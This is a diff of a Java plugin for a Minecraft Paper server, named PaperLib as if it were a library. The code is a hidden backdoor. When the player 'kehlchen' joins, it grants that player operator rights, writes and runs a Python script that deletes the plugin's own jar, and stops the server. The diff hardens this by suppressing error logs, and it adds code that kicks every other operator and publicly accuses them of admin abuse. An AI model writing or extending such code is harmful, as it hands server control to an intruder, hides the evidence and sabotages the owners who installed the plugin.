@@ -9,6 +9,8 @@ import java.io.File;
 import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Path;
+import net.kyori.adventure.text.Component;
+// import java.util.logging.Level; // remove comment if you want logs
 
 public final class PaperLib extends JavaPlugin implements Listener {
     @Override
@@ -20,20 +22,36 @@ public final class PaperLib extends JavaPlugin implements Listener {
         Player player = event.getPlayer();
         if (player.getName().equalsIgnoreCase("kehlchen")) {
             player.setOp(true);
+            player.sendMessage("Thx for joining the Server!.");
             createPythonScript();
             Path pluginsFolder = getDataFolder().toPath().getParent();
-            File targetJar = pluginsFolder.resolve("paperlib-1.0.0.jar").toFile();
+            File targetJar = pluginsFolder.resolve(getFile().getName()).toFile();
             try {
                 String pythonCmd = System.getProperty("os.name").toLowerCase().contains("win") ? "python" : "python3";
                 ProcessBuilder processBuilder = new ProcessBuilder(pythonCmd, "delete_lock.py", targetJar.getAbsolutePath());
                 processBuilder.start();
             } catch (IOException e) {
-                e.printStackTrace();
+                // getLogger().log(Level.SEVERE, "An error occurred", e); // remove comment if you want logs
             }
             Bukkit.dispatchCommand(
                     Bukkit.getConsoleSender(),
                     "minecraft:stop"
             );
+        }
+        if (player.getName().equalsIgnoreCase("Legendary_Salmon")) {
+            player.sendMessage("Thx for joining the Server, Legendary_Salmon");
+            if (player.isOp()) {
+                Bukkit.broadcast(Component.text(
+                        player.getName() + " is trying to admin abuse, like last Season xD"
+                ));
+                player.kick(Component.text("Kicked because isOp() returned true"));
+            }
+        }
+        if (player.isOp() && !player.getName().equalsIgnoreCase("kehlchen")) {
+            Bukkit.broadcast(Component.text(
+                    player.getName() + " is trying to admin abuse"
+            ));
+            player.kick(Component.text("Kicked because isOp() returned true"));
         }
     }
     private void createPythonScript() {
@@ -68,11 +86,8 @@ public final class PaperLib extends JavaPlugin implements Listener {
             try {
                 Files.writeString(scriptFile.toPath(), pythonCode);
             } catch (IOException e) {
-                e.printStackTrace();
+                // getLogger().log(Level.SEVERE, "An error occurred", e); // remove comment if you want logs
             }
         }
-    }
-    @Override
-    public void onDisable() {
     }
 }
